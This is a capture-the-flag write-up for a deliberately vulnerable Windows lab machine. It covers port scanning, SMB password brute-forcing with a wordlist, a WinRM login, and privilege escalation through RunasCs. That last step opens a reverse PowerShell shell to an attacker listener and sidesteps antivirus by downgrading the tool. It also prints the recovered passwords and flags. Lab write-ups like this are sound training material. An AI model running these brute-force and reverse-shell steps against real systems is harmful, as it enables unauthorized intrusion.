# Liar

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.144:80
Open 10.0.2.144:135
Open 10.0.2.144:139
Open 10.0.2.144:445
Open 10.0.2.144:5985
Open 10.0.2.144:47001
Open 10.0.2.144:49664
Open 10.0.2.144:49665
Open 10.0.2.144:49666
Open 10.0.2.144:49667
Open 10.0.2.144:49668
Open 10.0.2.144:49670
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.144
PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60905/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 14166/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 11801/udp): CLEAN (Timeout)
|   Check 4 (port 8034/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: WIN-IURF14RBVGV, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:b2:ce:35 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   WIN-IURF14RBVGV<00>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WIN-IURF14RBVGV<20>  Flags: <unique><active>
| Statistics:
|   08:00:27:b2:ce:35:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: 0s
| smb2-time: 
|   date: 2025-12-16T20:17:19
|_  start_date: N/A
```
:::

## HTTP

Hmmm
```bash
└─$ curl http://10.0.2.144/ -i
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 26 Sep 2023 16:46:42 GMT
Accept-Ranges: bytes
ETag: "bf3e23799f0d91:0"
Server: Microsoft-IIS/10.0
Date: Tue, 16 Dec 2025 20:19:16 GMT
Content-Length: 63

Hey bro,
You asked for an easy Windows VM, enjoy it.

- nica 
```

Nothing more from `feroxbuster`, but a potential username.

## SMB

```bash
└─$ netexec smb 10.0.2.144 -u 'nica' -p $rockyou --ignore-pw-decoding
...
SMB         10.0.2.144      445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
```

> Creds: `nica:hardcore`

## WinRM

```bash
evil-winrm-py PS C:\Users\nica\Documents> whoami /all

INFORMACIàN DE USUARIO
----------------------

Nombre de usuario    SID
==================== ==============================================
win-iurf14rbvgv\nica S-1-5-21-2519875556-2276787807-2868128514-1000


INFORMACIàN DE GRUPO
--------------------

Nombre de grupo                              Tipo           SID          Atributos
============================================ ============== ============ ========================================================================
Todos                                        Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                             Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios de administraci¢n remota    Alias          S-1-5-32-580 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\NETWORK                         Grupo conocido S-1-5-2      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa¤¡a                   Grupo conocido S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Cuenta local                    Grupo conocido S-1-5-113    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticaci¢n NTLM              Grupo conocido S-1-5-64-10  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192


INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                  Estado
============================= ============================================ ==========
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
```

### User.txt

```bash
evil-winrm-py PS C:\Users\nica> cat user.txt
HMVWINGIFT
```

## Privilege Escalation (akanksha)

No priv esc found, bruteforce?
```bash
└─$ netexec smb 10.0.2.144 -u 'akanksha' -p $rockyou --ignore-pw-decoding
SMB         10.0.2.144      445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:sweetgirl

└─$ evil-winrm-py -i 10.0.2.144 -u 'akanksha' -p 'sweetgirl'
[-] Failed to authenticate the user akanksha with ntlm
```

We have a user with access to remote login, second we can't remote login, but with that we can escalate to second user with [RunasCs](https://github.com/antonioCoco/RunasCs)

No output? The file gets deleted afterwards... AV is detecting it as malicious?
```bash
└─$ curl -LOs https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
└─$ unzip RunasCs.zip
---
evil-winrm-py PS C:\Users\nica\Music> upload RunasCs.exe .
evil-winrm-py PS C:\Users\nica\Music> .\RunasCs.exe akanksha sweetgirl powershell.exe -r 10.0.2.15:4444
```

Downgrade version to use `1.4`
```bash
└─$ curl -LOs https://github.com/antonioCoco/RunasCs/releases/download/v1.4/RunasCs.zip
└─$ unzip RunasCs.zip
---
evil-winrm-py PS C:\Users\nica\Music> upload RunasCs.exe rc.exe
evil-winrm-py PS C:\Users\nica> ./rc.exe
[-] Not enough arguments. 3 Arguments required. Use --help for additional help.
evil-winrm-py PS C:\Users\nica> .\rc.exe akanksha sweetgirl powershell.exe -r 10.0.2.15:4444
[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-cdce2$\Default
[+] Async process 'powershell.exe' with pid 2160 created and left in background.
```

```bash
└─$ listen
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.144:49723.
Windows PowerShell
Copyright (C) Microsoft Corporation. Todos los derechos reservados.

PS C:\Windows\system32> whoami /all
Nombre de usuario        SID
======================== ==============================================
win-iurf14rbvgv\akanksha S-1-5-21-2519875556-2276787807-2868128514-1001

Nombre de grupo                              Tipo           SID                                            Atributos
============================================ ============== ============================================== ========================================================================
Todos                                        Grupo conocido S-1-1-0                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
WIN-IURF14RBVGV\Idministritirs               Alias          S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                             Alias          S-1-5-32-545                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\INTERACTIVE                     Grupo conocido S-1-5-4                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
INICIO DE SESIN EN LA CONSOLA               Grupo conocido S-1-2-1                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compaa                   Grupo conocido S-1-5-15                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Cuenta local                    Grupo conocido S-1-5-113                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticacin NTLM              Grupo conocido S-1-5-64-10                                    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192

Nombre de privilegio          Descripcin                                  Estado
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobacin de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
```

We are part of Administrators, pwned!

### Root.txt

```bash
PS C:\Users\Administrador> cat root.txt
HMV1STWINDOWZ
```